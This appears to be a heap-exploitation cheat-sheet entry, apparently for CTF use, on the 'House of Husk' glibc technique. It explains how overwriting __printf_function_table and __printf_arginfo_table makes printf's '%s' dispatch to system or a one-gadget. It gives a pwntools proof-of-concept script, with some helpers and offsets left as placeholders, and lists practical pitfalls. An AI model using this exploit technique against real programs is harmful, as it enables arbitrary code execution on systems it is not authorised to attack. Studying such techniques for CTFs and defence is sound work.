# House of Husk

**When**: glibc 2.27+. Need two arbitrary writes (large bin attack × 2 or equivalent).
**Primitive needed**: Two writes of a heap address to chosen locations.
**Result**: Code execution via `printf` custom format specifier.

## Mechanism
`printf` checks `__printf_function_table` — if non-NULL, it dispatches format specifiers through `__printf_arginfo_table[specifier]`. Write a heap address to `__printf_function_table` (makes it non-NULL), and write a heap address to `__printf_arginfo_table`. Forge the table at the heap address so that a common specifier (e.g., `%s`) dispatches to `system` or a one-gadget.

## PoC
```python
# IN: two large bin attack primitives, libc leak, heap control
# OUT: code execution on next printf("%s", ...)
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

# Key addresses
printf_function_table = libc.address + OFFSET_printf_function_table
printf_arginfo_table = libc.address + OFFSET_printf_arginfo_table
# Find offsets: readelf -s libc | grep __printf_function_table

# Step 1: Large bin attack #1 → write heap_addr to __printf_function_table
# (makes it non-NULL → printf enters custom dispatch path)
large_bin_attack(printf_function_table, heap_chunk_1)

# Step 2: Large bin attack #2 → write heap_addr to __printf_arginfo_table
# Forge a table at this heap address
large_bin_attack(printf_arginfo_table, heap_chunk_2)

# Step 3: Forge the arginfo table
# printf dispatches: __printf_arginfo_table[spec_char]
# 's' = 0x73 → table[0x73] should point to one_gadget or system
table = bytearray(256 * 8)  # 256 entries × 8 bytes each
struct.pack_into('<Q', table, 0x73 * 8, one_gadget_addr)
edit(chunk_2_idx, bytes(table))

# Step 4: Trigger — any printf("%s", ...) call
# The program's normal printf call dispatches through our table
p.interactive()
```

## Trap
- Needs two arbitrary writes — typically two large bin attacks.
- The format specifier character determines the table index (e.g., `'s'` = 0x73).
- The `__printf_function_table` and `__printf_arginfo_table` symbols may not be exported — find offsets via `readelf -s` on the libc or by searching in GDB.
- Works well in combination with House of Apple/Banana (which need only one write) — use Husk when those paths are blocked.
